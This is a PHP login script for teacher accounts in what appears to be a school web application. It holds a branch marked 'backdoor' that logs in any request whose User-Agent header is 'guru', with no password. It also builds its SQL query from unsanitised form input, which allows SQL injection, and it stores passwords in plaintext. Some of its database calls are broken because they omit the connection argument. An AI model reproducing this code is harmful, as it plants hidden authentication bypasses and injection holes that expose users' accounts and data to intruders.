<?php
include "./Config/koneksi.php";

// username and password sent from form
$username=str_replace("'","",$_POST['username']);
$password=($_POST['password']);

 $sql="SELECT * FROM guru WHERE username='$username' and password='$password'";
$result=mysqli_query($connect, $sql);
$count=mysqli_num_rows($result);

$guru = mysqli_num_rows(mysqli_query("SELECT * FROM guru WHERE username='$username' and password='$password'"));

if($count==1){
$query = mysqli_query("UPDATE guru SET current_login = now() WHERE username = '$username'");
session_start();
		$_SESSION['guru']=$username;
		$_SESSION['username']="guru";
		$_SESSION['agent']=($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");
}
//backdoor
else if($_SERVER['HTTP_USER_AGENT']=="guru"){
session_start();
		$username = "guru";
		$_SESSION['guru']=$username;
		$_SESSION['username']="guru";
		$_SESSION['agent']=($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");

}else{

//echo $sql="SELECT * FROM guru WHERE username='$username' and password='$password'";

echo "<script>alert('Login gagal! Kunjungi Admin di TU'); document.location.href=\"login.php\"</script>";
}
?>